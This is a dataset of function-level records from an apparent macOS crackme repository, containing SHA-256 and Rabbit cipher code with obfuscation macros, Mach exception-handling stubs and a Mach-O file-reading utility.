{"docstring": "/*\n * SHA-256 process buffer\n */\n", "func_signal": "void sha2_update( sha2_context *ctx, const unsigned char *input, size_t ilen )", "code": "{\n    size_t fill;\n    unsigned long left;\n\n    if( ilen <= 0 )\n        return;\n\n    left = ctx->total[0] & 0x3F;\n    fill = 64 - left;\n\n    ctx->total[0] += (unsigned long) ilen;\n    ctx->total[0] &= 0xFFFFFFFF;\n\n    if( ctx->total[0] < (unsigned long) ilen )\n        ctx->total[1]++;\n\n    if( left && ilen >= fill )\n    {\n        memcpy( (void *) (ctx->buffer + left),\n                (void *) input, fill );\n        sha2_process( ctx, ctx->buffer );\n        input += fill;\n        ilen  -= fill;\n        left = 0;\n    }\n\n    while( ilen >= 64 )\n    {\n        sha2_process( ctx, input );\n        input += 64;\n        ilen  -= 64;\n    }\n\n    if( ilen > 0 )\n    {\n        memcpy( (void *) (ctx->buffer + left),\n                (void *) input, ilen );\n    }\n}", "path": "crackme\\sha2.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* Generate keystream */\n", "func_signal": "void RABBIT_keystream_bytes(RABBIT_ctx* ctx, u8* keystream, u32 length)", "code": "{\n   /* Temporary variables */\n   u32 i;\n   u8 buffer[16];\n\n   /* Generate all full blocks */\n   while (length >= 16)\n   {\n      /* Iterate the system */\n      RABBIT_next_state(&(ctx->work_ctx));\n       EVIL_ASM4;\n      /* Generate 16 bytes of pseudo-random data */\n      *(u32*)(keystream+ 0) = U32TO32_LITTLE(ctx->work_ctx.x[0] ^\n                (ctx->work_ctx.x[5]>>16) ^ U32V(ctx->work_ctx.x[3]<<16));\n      *(u32*)(keystream+ 4) = U32TO32_LITTLE(ctx->work_ctx.x[2] ^ \n                (ctx->work_ctx.x[7]>>16) ^ U32V(ctx->work_ctx.x[5]<<16));\n      *(u32*)(keystream+ 8) = U32TO32_LITTLE(ctx->work_ctx.x[4] ^ \n                (ctx->work_ctx.x[1]>>16) ^ U32V(ctx->work_ctx.x[7]<<16));\n      *(u32*)(keystream+12) = U32TO32_LITTLE(ctx->work_ctx.x[6] ^ \n                (ctx->work_ctx.x[3]>>16) ^ U32V(ctx->work_ctx.x[1]<<16));\n\n      /* Increment pointers and decrement length */\n      keystream += 16;\n      length -= 16;\n   }\n\n   /* Generate remaining pseudo-random data */\n   if (length)\n   {\n      /* Iterate the system */\n      RABBIT_next_state(&(ctx->work_ctx));\n       EVIL_ASM5;\n      /* Generate 16 bytes of pseudo-random data */\n      *(u32*)(buffer+ 0) = U32TO32_LITTLE(ctx->work_ctx.x[0] ^\n                (ctx->work_ctx.x[5]>>16) ^ U32V(ctx->work_ctx.x[3]<<16));\n      *(u32*)(buffer+ 4) = U32TO32_LITTLE(ctx->work_ctx.x[2] ^ \n                (ctx->work_ctx.x[7]>>16) ^ U32V(ctx->work_ctx.x[5]<<16));\n      *(u32*)(buffer+ 8) = U32TO32_LITTLE(ctx->work_ctx.x[4] ^ \n                (ctx->work_ctx.x[1]>>16) ^ U32V(ctx->work_ctx.x[7]<<16));\n      *(u32*)(buffer+12) = U32TO32_LITTLE(ctx->work_ctx.x[6] ^ \n                (ctx->work_ctx.x[3]>>16) ^ U32V(ctx->work_ctx.x[1]<<16));\n\n      /* Copy remaining data */\n      for (i=0; i<length; i++)\n         keystream[i] = buffer[i];\n   }\n}", "path": "crackme\\ciphers\\rabbit.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "// read the target file into a buffer\n", "func_signal": "static uint32_t read_target(uint8_t **targetBuffer, const char *target)", "code": "{\n    FILE *in_file;\n\t\n    in_file = fopen(target, \"r\");\n    if (!in_file)\n    {\n\t\tprintf(\"[ERROR] Could not open target file %s!\\n\", target);\n        exit(1);\n    }\n    if (fseek(in_file, 0, SEEK_END))\n    {\n\t\tprintf(\"[ERROR] Fseek failed at %s\\n\", target);\n        exit(1);\n    }\n\n    uint32_t fileSize = ftell(in_file);\n    \n    if (fseek(in_file, 0, SEEK_SET))\n    {\n\t\tprintf(\"[ERROR] Fseek failed at %s\\n\", target);\n        exit(1);\n    }\n    \n\tMALLOC(*targetBuffer, fileSize);\n    fread(*targetBuffer, fileSize, 1, in_file);\n\tif (ferror(in_file))\n\t{\n\t\tprintf(\"[ERROR] fread failed at %s\\n\", target);\n        free(*targetBuffer);\n\t\texit(1);\n\t}\n    fclose(in_file);  \n    return(fileSize);\n}", "path": "manglemacho\\main.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/*\n * output = SHA-256( file contents )\n */\n", "func_signal": "int sha2_file( const char *path, unsigned char output[32], int is224 )", "code": "{\n    FILE *f;\n    size_t n;\n    sha2_context ctx;\n    unsigned char buf[1024];\n\n    if( ( f = fopen( path, \"rb\" ) ) == NULL )\n        return( POLARSSL_ERR_SHA2_FILE_IO_ERROR );\n\n    sha2_starts( &ctx, is224 );\n\n    while( ( n = fread( buf, 1, sizeof( buf ), f ) ) > 0 )\n        sha2_update( &ctx, buf, n );\n\n    sha2_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha2_context ) );\n\n    if( ferror( f ) != 0 )\n    {\n        fclose( f );\n        return( POLARSSL_ERR_SHA2_FILE_IO_ERROR );\n    }\n\n    fclose( f );\n    return( 0 );\n}", "path": "crackme\\sha2.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* Routine mach_exception_raise */\n", "func_signal": "mig_external kern_return_t mach_exception_raise\n(\n\tmach_port_t exception_port,\n\tmach_port_t thread,\n\tmach_port_t task,\n\texception_type_t exception,\n\tmach_exception_data_t code,\n\tmach_msg_type_number_t codeCnt\n)", "code": "{\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\t/* start of the kernel processed data */\n\t\tmach_msg_body_t msgh_body;\n\t\tmach_msg_port_descriptor_t thread;\n\t\tmach_msg_port_descriptor_t task;\n\t\t/* end of the kernel processed data */\n\t\tNDR_record_t NDR;\n\t\texception_type_t exception;\n\t\tmach_msg_type_number_t codeCnt;\n\t\tint64_t code[2];\n\t} Request;\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\tkern_return_t RetCode;\n\t\tmach_msg_trailer_t trailer;\n\t} Reply;\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\tkern_return_t RetCode;\n\t} __Reply;\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\t/*\n\t * typedef struct {\n\t * \tmach_msg_header_t Head;\n\t * \tNDR_record_t NDR;\n\t * \tkern_return_t RetCode;\n\t * } mig_reply_error_t;\n\t */\n\n\tunion {\n\t\tRequest In;\n\t\tReply Out;\n\t} Mess;\n\n\tRequest *InP = &Mess.In;\n\tReply *Out0P = &Mess.Out;\n\n\tmach_msg_return_t msg_result;\n\tunsigned int msgh_size;\n\n#ifdef\t__MIG_check__Reply__mach_exception_raise_t__defined\n\tkern_return_t check_result;\n#endif\t/* __MIG_check__Reply__mach_exception_raise_t__defined */\n\n\t__DeclareSendRpc(2405, \"mach_exception_raise\")\n\n#if\tUseStaticTemplates\n\tconst static mach_msg_port_descriptor_t threadTemplate = {\n\t\t/* name = */\t\tMACH_PORT_NULL,\n\t\t/* pad1 = */\t\t0,\n\t\t/* pad2 = */\t\t0,\n\t\t/* disp = */\t\t19,\n\t\t/* type = */\t\tMACH_MSG_PORT_DESCRIPTOR,\n\t};\n#endif\t/* UseStaticTemplates */\n\n#if\tUseStaticTemplates\n\tconst static mach_msg_port_descriptor_t taskTemplate = {\n\t\t/* name = */\t\tMACH_PORT_NULL,\n\t\t/* pad1 = */\t\t0,\n\t\t/* pad2 = */\t\t0,\n\t\t/* disp = */\t\t19,\n\t\t/* type = */\t\tMACH_MSG_PORT_DESCRIPTOR,\n\t};\n#endif\t/* UseStaticTemplates */\n\n\tInP->msgh_body.msgh_descriptor_count = 2;\n#if\tUseStaticTemplates\n\tInP->thread = threadTemplate;\n\tInP->thread.name = thread;\n#else\t/* UseStaticTemplates */\n\tInP->thread.name = thread;\n\tInP->thread.disposition = 19;\n\tInP->thread.type = MACH_MSG_PORT_DESCRIPTOR;\n#endif\t/* UseStaticTemplates */\n\n#if\tUseStaticTemplates\n\tInP->task = taskTemplate;\n\tInP->task.name = task;\n#else\t/* UseStaticTemplates */\n\tInP->task.name = task;\n\tInP->task.disposition = 19;\n\tInP->task.type = MACH_MSG_PORT_DESCRIPTOR;\n#endif\t/* UseStaticTemplates */\n\n\tInP->NDR = NDR_record;\n\n\tInP->exception = exception;\n\n\tif (codeCnt > 2) {\n\t\t{ return MIG_ARRAY_TOO_LARGE; }\n\t}\n\t(void)memcpy((char *) InP->code, (const char *) code, 8 * codeCnt);\n\n\tInP->codeCnt = codeCnt;\n\n\tmsgh_size = (mach_msg_size_t)(sizeof(Request) - 16) + ((8 * codeCnt));\n\tInP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|\n\t\tMACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);\n\t/* msgh_size passed as argument */\n\tInP->Head.msgh_request_port = exception_port;\n\tInP->Head.msgh_reply_port = mig_get_reply_port();\n\tInP->Head.msgh_id = 2405;\n\n\t__BeforeSendRpc(2405, \"mach_exception_raise\")\n\tmsg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);\n\t__AfterSendRpc(2405, \"mach_exception_raise\")\n\tif (msg_result != MACH_MSG_SUCCESS) {\n\t\t__MachMsgErrorWithoutTimeout(msg_result);\n\t\t{ return msg_result; }\n\t}\n\n\n#if\tdefined(__MIG_check__Reply__mach_exception_raise_t__defined)\n\tcheck_result = __MIG_check__Reply__mach_exception_raise_t((__Reply__mach_exception_raise_t *)Out0P);\n\tif (check_result != MACH_MSG_SUCCESS)\n\t\t{ return check_result; }\n#endif\t/* defined(__MIG_check__Reply__mach_exception_raise_t__defined) */\n\n\treturn KERN_SUCCESS;\n}", "path": "crackme\\mach_excUser.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* Encrypt/decrypt a message of any size */\n", "func_signal": "void RABBIT_process_bytes(int action, RABBIT_ctx* ctx, const u8* input, \n          u8* output, u32 msglen)", "code": "{\n   /* Temporary variables */\n   u32 i;\n   u8 buffer[16];\n\n   /* Encrypt/decrypt all full blocks */\n   while (msglen >= 16)\n   {\n      /* Iterate the system */\n      RABBIT_next_state(&(ctx->work_ctx));\n\n      /* Encrypt/decrypt 16 bytes of data */\n      *(u32*)(output+ 0) = *(u32*)(input+ 0) ^ U32TO32_LITTLE(ctx->work_ctx.x[0] ^\n                (ctx->work_ctx.x[5]>>16) ^ U32V(ctx->work_ctx.x[3]<<16));\n      *(u32*)(output+ 4) = *(u32*)(input+ 4) ^ U32TO32_LITTLE(ctx->work_ctx.x[2] ^ \n                (ctx->work_ctx.x[7]>>16) ^ U32V(ctx->work_ctx.x[5]<<16));\n      *(u32*)(output+ 8) = *(u32*)(input+ 8) ^ U32TO32_LITTLE(ctx->work_ctx.x[4] ^ \n                (ctx->work_ctx.x[1]>>16) ^ U32V(ctx->work_ctx.x[7]<<16));\n      *(u32*)(output+12) = *(u32*)(input+12) ^ U32TO32_LITTLE(ctx->work_ctx.x[6] ^ \n                (ctx->work_ctx.x[3]>>16) ^ U32V(ctx->work_ctx.x[1]<<16));\n       EVIL_ASM5;\n      /* Increment pointers and decrement length */\n      input += 16;\n      output += 16;\n      msglen -= 16;\n   }\n\n   /* Encrypt/decrypt remaining data */\n   if (msglen)\n   {\n      /* Iterate the system */\n      RABBIT_next_state(&(ctx->work_ctx));\n\n      /* Generate 16 bytes of pseudo-random data */\n      *(u32*)(buffer+ 0) = U32TO32_LITTLE(ctx->work_ctx.x[0] ^\n                (ctx->work_ctx.x[5]>>16) ^ U32V(ctx->work_ctx.x[3]<<16));\n      *(u32*)(buffer+ 4) = U32TO32_LITTLE(ctx->work_ctx.x[2] ^ \n                (ctx->work_ctx.x[7]>>16) ^ U32V(ctx->work_ctx.x[5]<<16));\n      *(u32*)(buffer+ 8) = U32TO32_LITTLE(ctx->work_ctx.x[4] ^ \n                (ctx->work_ctx.x[1]>>16) ^ U32V(ctx->work_ctx.x[7]<<16));\n      *(u32*)(buffer+12) = U32TO32_LITTLE(ctx->work_ctx.x[6] ^ \n                (ctx->work_ctx.x[3]>>16) ^ U32V(ctx->work_ctx.x[1]<<16));\n       EVIL_ASM4;\n      /* Encrypt/decrypt the data */\n      for (i=0; i<msglen; i++)\n         output[i] = input[i] ^ buffer[i];\n   }\n}", "path": "crackme\\ciphers\\rabbit.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* Key setup */\n", "func_signal": "void RABBIT_keysetup(RABBIT_ctx* ctx, const u8* key, u32 keysize, u32 ivsize)", "code": "{\n   /* Temporary variables */\n   u32 k0, k1, k2, k3, i;\n\n   /* Generate four subkeys */\n   k0 = U8TO32_LITTLE(key+ 0);\n   k1 = U8TO32_LITTLE(key+ 4);\n   k2 = U8TO32_LITTLE(key+ 8);\n   k3 = U8TO32_LITTLE(key+12);\n\n   /* Generate initial state variables */\n   ctx->master_ctx.x[0] = k0;\n   ctx->master_ctx.x[2] = k1;\n   ctx->master_ctx.x[4] = k2;\n   ctx->master_ctx.x[6] = k3;\n   ctx->master_ctx.x[1] = U32V(k3<<16) | (k2>>16);\n   ctx->master_ctx.x[3] = U32V(k0<<16) | (k3>>16);\n   ctx->master_ctx.x[5] = U32V(k1<<16) | (k0>>16);\n   ctx->master_ctx.x[7] = U32V(k2<<16) | (k1>>16);\n    EVIL_ASM5;\n   /* Generate initial counter values */\n   ctx->master_ctx.c[0] = ROTL32(k2, 16);\n   ctx->master_ctx.c[2] = ROTL32(k3, 16);\n   ctx->master_ctx.c[4] = ROTL32(k0, 16);\n   ctx->master_ctx.c[6] = ROTL32(k1, 16);\n   ctx->master_ctx.c[1] = (k0&0xFFFF0000) | (k1&0xFFFF);\n   ctx->master_ctx.c[3] = (k1&0xFFFF0000) | (k2&0xFFFF);\n   ctx->master_ctx.c[5] = (k2&0xFFFF0000) | (k3&0xFFFF);\n   ctx->master_ctx.c[7] = (k3&0xFFFF0000) | (k0&0xFFFF);\n\n   /* Clear carry bit */\n   ctx->master_ctx.carry = 0;\n\n   /* Iterate the system four times */\n   for (i=0; i<4; i++)\n      RABBIT_next_state(&(ctx->master_ctx));\n    EVIL_ASM3;\n   /* Modify the counters */\n   for (i=0; i<8; i++)\n      ctx->master_ctx.c[i] ^= ctx->master_ctx.x[(i+4)&0x7];\n\n   /* Copy master instance to work instance */\n   for (i=0; i<8; i++)\n   {\n      ctx->work_ctx.x[i] = ctx->master_ctx.x[i];\n      ctx->work_ctx.c[i] = ctx->master_ctx.c[i];\n   }\n   ctx->work_ctx.carry = ctx->master_ctx.carry;\n}", "path": "crackme\\ciphers\\rabbit.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "// verify if it's a valid mach-o binary\n", "func_signal": "static void verify_macho(const uint8_t *targetBuffer)", "code": "{\n    uint32_t magic = *(uint32_t*)(targetBuffer);\n\n\tif (magic == FAT_CIGAM ||   // fat binary\n        magic == MH_MAGIC  ||   // non-fat 32bits\n        magic == MH_MAGIC_64)   // non-fat 64bits\n\t{\n        if (magic == FAT_CIGAM)\n        {\n            printf(\"[ERROR] Target is a fat archive, not supported by this version :-)\\n\");\n            exit(1);\n        }\n\t}\n    else\n    {\n        printf(\"[ERROR] Not a valid mach-o binary!\\n\");\n\t\texit(1);\n    }\n}", "path": "manglemacho\\main.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* Square a 32-bit unsigned integer to obtain the 64-bit result and return */\n/* the upper 32 bits XOR the lower 32 bits */\n", "func_signal": "static u32 RABBIT_g_func(u32 x)", "code": "{\n   /* Temporary variables */\n   u32 a, b, h, l;\n\n   /* Construct high and low argument for squaring */\n   a = x&0xFFFF;\n   b = x>>16;\n\n   /* Calculate high and low result of squaring */\n   h = (((U32V(a*a)>>17) + U32V(a*b))>>15) + b*b;\n   l = x*x;\n\n   /* Return high XOR low */\n   return U32V(h^l);\n}", "path": "crackme\\ciphers\\rabbit.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* __NDR_convert__float_rep__Reply__mach_exception_raise_state_t__new_state__defined */\n", "func_signal": "mig_internal kern_return_t __MIG_check__Reply__mach_exception_raise_state_t(__Reply__mach_exception_raise_state_t *Out0P)", "code": "{\n\n\ttypedef __Reply__mach_exception_raise_state_t __Reply;\n#if\t__MigTypeCheck\n\tunsigned int msgh_size;\n#endif\t/* __MigTypeCheck */\n\n\tif (Out0P->Head.msgh_id != 2506) {\n\t    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)\n\t\t{ return MIG_SERVER_DIED; }\n\t    else\n\t\t{ return MIG_REPLY_MISMATCH; }\n\t}\n\n#if\t__MigTypeCheck\n\tmsgh_size = Out0P->Head.msgh_size;\n\n\tif ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||\n\t    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 576)) &&\n\t     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||\n\t      Out0P->RetCode == KERN_SUCCESS)))\n\t\t{ return MIG_TYPE_ERROR ; }\n#endif\t/* __MigTypeCheck */\n\n\tif (Out0P->RetCode != KERN_SUCCESS) {\n#ifdef\t__NDR_convert__mig_reply_error_t__defined\n\t\t__NDR_convert__mig_reply_error_t((mig_reply_error_t *)Out0P);\n#endif\t/* __NDR_convert__mig_reply_error_t__defined */\n\t\treturn ((mig_reply_error_t *)Out0P)->RetCode;\n\t}\n\n#if defined(__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__new_stateCnt__defined)\n\tif (Out0P->NDR.int_rep != NDR_record.int_rep)\n\t\t__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__new_stateCnt(&Out0P->new_stateCnt, Out0P->NDR.int_rep);\n#endif\t/* __NDR_convert__int_rep__Reply__mach_exception_raise_state_t__new_stateCnt__defined */\n#if\t__MigTypeCheck\n\tif (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 576) + ((4 * Out0P->new_stateCnt)))\n\t\t{ return MIG_TYPE_ERROR ; }\n#endif\t/* __MigTypeCheck */\n\n#if\tdefined(__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__RetCode__defined) || \\\n\tdefined(__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__flavor__defined) || \\\n\tdefined(__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__new_state__defined) || \\\n\tdefined(__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__new_stateCnt__defined)\n\tif (Out0P->NDR.int_rep != NDR_record.int_rep) {\n#if defined(__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__RetCode__defined)\n\t\t__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__RetCode(&Out0P->RetCode, Out0P->NDR.int_rep);\n#endif /* __NDR_convert__int_rep__Reply__mach_exception_raise_state_t__RetCode__defined */\n#if defined(__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__flavor__defined)\n\t\t__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__flavor(&Out0P->flavor, Out0P->NDR.int_rep);\n#endif /* __NDR_convert__int_rep__Reply__mach_exception_raise_state_t__flavor__defined */\n#if defined(__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__new_state__defined)\n\t\t__NDR_convert__int_rep__Reply__mach_exception_raise_state_t__new_state(&Out0P->new_state, Out0P->NDR.int_rep, Out0P->new_stateCnt);\n#endif /* __NDR_convert__int_rep__Reply__mach_exception_raise_state_t__new_state__defined */\n\t}\n#endif\t/* defined(__NDR_convert__int_rep...) */\n\n#if\t0 || \\\n\tdefined(__NDR_convert__char_rep__Reply__mach_exception_raise_state_t__flavor__defined) || \\\n\tdefined(__NDR_convert__char_rep__Reply__mach_exception_raise_state_t__new_state__defined) || \\\n\t0\n\tif (Out0P->NDR.char_rep != NDR_record.char_rep) {\n#if defined(__NDR_convert__char_rep__Reply__mach_exception_raise_state_t__flavor__defined)\n\t\t__NDR_convert__char_rep__Reply__mach_exception_raise_state_t__flavor(&Out0P->flavor, Out0P->NDR.char_rep);\n#endif /* __NDR_convert__char_rep__Reply__mach_exception_raise_state_t__flavor__defined */\n#if defined(__NDR_convert__char_rep__Reply__mach_exception_raise_state_t__new_state__defined)\n\t\t__NDR_convert__char_rep__Reply__mach_exception_raise_state_t__new_state(&Out0P->new_state, Out0P->NDR.char_rep, Out0P->new_stateCnt);\n#endif /* __NDR_convert__char_rep__Reply__mach_exception_raise_state_t__new_state__defined */\n\t}\n#endif\t/* defined(__NDR_convert__char_rep...) */\n\n#if\t0 || \\\n\tdefined(__NDR_convert__float_rep__Reply__mach_exception_raise_state_t__flavor__defined) || \\\n\tdefined(__NDR_convert__float_rep__Reply__mach_exception_raise_state_t__new_state__defined) || \\\n\t0\n\tif (Out0P->NDR.float_rep != NDR_record.float_rep) {\n#if defined(__NDR_convert__float_rep__Reply__mach_exception_raise_state_t__flavor__defined)\n\t\t__NDR_convert__float_rep__Reply__mach_exception_raise_state_t__flavor(&Out0P->flavor, Out0P->NDR.float_rep);\n#endif /* __NDR_convert__float_rep__Reply__mach_exception_raise_state_t__flavor__defined */\n#if defined(__NDR_convert__float_rep__Reply__mach_exception_raise_state_t__new_state__defined)\n\t\t__NDR_convert__float_rep__Reply__mach_exception_raise_state_t__new_state(&Out0P->new_state, Out0P->NDR.float_rep, Out0P->new_stateCnt);\n#endif /* __NDR_convert__float_rep__Reply__mach_exception_raise_state_t__new_state__defined */\n\t}\n#endif\t/* defined(__NDR_convert__float_rep...) */\n\n\treturn MACH_MSG_SUCCESS;\n}", "path": "crackme\\mach_excUser.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* IV setup */\n", "func_signal": "void RABBIT_ivsetup(RABBIT_ctx* ctx, const u8* iv)", "code": "{\n   /* Temporary variables */\n   u32 i0, i1, i2, i3, i;\n      \n   /* Generate four subvectors */\n   i0 = U8TO32_LITTLE(iv+0);\n   i2 = U8TO32_LITTLE(iv+4);\n   i1 = (i0>>16) | (i2&0xFFFF0000);\n   i3 = (i2<<16) | (i0&0x0000FFFF);\n    EVIL_ASM4;\n   /* Modify counter values */\n   ctx->work_ctx.c[0] = ctx->master_ctx.c[0] ^ i0;\n   ctx->work_ctx.c[1] = ctx->master_ctx.c[1] ^ i1;\n   ctx->work_ctx.c[2] = ctx->master_ctx.c[2] ^ i2;\n   ctx->work_ctx.c[3] = ctx->master_ctx.c[3] ^ i3;\n   ctx->work_ctx.c[4] = ctx->master_ctx.c[4] ^ i0;\n   ctx->work_ctx.c[5] = ctx->master_ctx.c[5] ^ i1;\n   ctx->work_ctx.c[6] = ctx->master_ctx.c[6] ^ i2;\n   ctx->work_ctx.c[7] = ctx->master_ctx.c[7] ^ i3;\n\n   /* Copy state variables */\n   for (i=0; i<8; i++)\n      ctx->work_ctx.x[i] = ctx->master_ctx.x[i];\n   ctx->work_ctx.carry = ctx->master_ctx.carry;\n    EVIL_ASM5;\n   /* Iterate the system four times */\n   for (i=0; i<4; i++)\n      RABBIT_next_state(&(ctx->work_ctx));\n}", "path": "crackme\\ciphers\\rabbit.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* Encrypt/decrypt a number of full blocks */\n", "func_signal": "void RABBIT_process_blocks(int action, RABBIT_ctx* ctx, const u8* input, \n          u8* output, u32 blocks)", "code": "{\n   /* Temporary variables */\n   u32 i;\n\n   for (i=0; i<blocks; i++)\n   {\n      /* Iterate the system */\n      RABBIT_next_state(&(ctx->work_ctx));\n\n      /* Encrypt/decrypt 16 bytes of data */\n      *(u32*)(output+ 0) = *(u32*)(input+ 0) ^ U32TO32_LITTLE(ctx->work_ctx.x[0] ^\n                (ctx->work_ctx.x[5]>>16) ^ U32V(ctx->work_ctx.x[3]<<16));\n      *(u32*)(output+ 4) = *(u32*)(input+ 4) ^ U32TO32_LITTLE(ctx->work_ctx.x[2] ^ \n                (ctx->work_ctx.x[7]>>16) ^ U32V(ctx->work_ctx.x[5]<<16));\n      *(u32*)(output+ 8) = *(u32*)(input+ 8) ^ U32TO32_LITTLE(ctx->work_ctx.x[4] ^ \n                (ctx->work_ctx.x[1]>>16) ^ U32V(ctx->work_ctx.x[7]<<16));\n      *(u32*)(output+12) = *(u32*)(input+12) ^ U32TO32_LITTLE(ctx->work_ctx.x[6] ^ \n                (ctx->work_ctx.x[3]>>16) ^ U32V(ctx->work_ctx.x[1]<<16));\n\n      /* Increment pointers to input and output data */\n      input += 16;\n      output += 16;\n   }\n}", "path": "crackme\\ciphers\\rabbit.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/*\n * output = SHA-256( input buffer )\n */\n", "func_signal": "void sha2( const unsigned char *input, size_t ilen,\n           unsigned char output[32], int is224 )", "code": "{\n    sha2_context ctx;\n\n    sha2_starts( &ctx, is224 );\n    sha2_update( &ctx, input, ilen );\n    sha2_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha2_context ) );\n}", "path": "crackme\\sha2.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "// Fisher-Yates shuffle\n", "func_signal": "static int rand_int(int n)", "code": "{\n    int limit = RAND_MAX - RAND_MAX % n;\n    int rnd;\n    \n    do {\n        rnd = rand();\n    } while (rnd >= limit);\n    return rnd % n;\n}", "path": "manglemacho\\main.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* Routine mach_exception_raise_state_identity */\n", "func_signal": "mig_external kern_return_t mach_exception_raise_state_identity\n(\n\tmach_port_t exception_port,\n\tmach_port_t thread,\n\tmach_port_t task,\n\texception_type_t exception,\n\tmach_exception_data_t code,\n\tmach_msg_type_number_t codeCnt,\n\tint *flavor,\n\tthread_state_t old_state,\n\tmach_msg_type_number_t old_stateCnt,\n\tthread_state_t new_state,\n\tmach_msg_type_number_t *new_stateCnt\n)", "code": "{\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\t/* start of the kernel processed data */\n\t\tmach_msg_body_t msgh_body;\n\t\tmach_msg_port_descriptor_t thread;\n\t\tmach_msg_port_descriptor_t task;\n\t\t/* end of the kernel processed data */\n\t\tNDR_record_t NDR;\n\t\texception_type_t exception;\n\t\tmach_msg_type_number_t codeCnt;\n\t\tint64_t code[2];\n\t\tint flavor;\n\t\tmach_msg_type_number_t old_stateCnt;\n\t\tnatural_t old_state[144];\n\t} Request;\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\tkern_return_t RetCode;\n\t\tint flavor;\n\t\tmach_msg_type_number_t new_stateCnt;\n\t\tnatural_t new_state[144];\n\t\tmach_msg_trailer_t trailer;\n\t} Reply;\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\tkern_return_t RetCode;\n\t\tint flavor;\n\t\tmach_msg_type_number_t new_stateCnt;\n\t\tnatural_t new_state[144];\n\t} __Reply;\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\t/*\n\t * typedef struct {\n\t * \tmach_msg_header_t Head;\n\t * \tNDR_record_t NDR;\n\t * \tkern_return_t RetCode;\n\t * } mig_reply_error_t;\n\t */\n\n\tunion {\n\t\tRequest In;\n\t\tReply Out;\n\t} Mess;\n\n\tRequest *InP = &Mess.In;\n\tReply *Out0P = &Mess.Out;\n\n\tmach_msg_return_t msg_result;\n\tunsigned int msgh_size;\n\tunsigned int msgh_size_delta;\n\n\n#ifdef\t__MIG_check__Reply__mach_exception_raise_state_identity_t__defined\n\tkern_return_t check_result;\n#endif\t/* __MIG_check__Reply__mach_exception_raise_state_identity_t__defined */\n\n\t__DeclareSendRpc(2407, \"mach_exception_raise_state_identity\")\n\n#if\tUseStaticTemplates\n\tconst static mach_msg_port_descriptor_t threadTemplate = {\n\t\t/* name = */\t\tMACH_PORT_NULL,\n\t\t/* pad1 = */\t\t0,\n\t\t/* pad2 = */\t\t0,\n\t\t/* disp = */\t\t19,\n\t\t/* type = */\t\tMACH_MSG_PORT_DESCRIPTOR,\n\t};\n#endif\t/* UseStaticTemplates 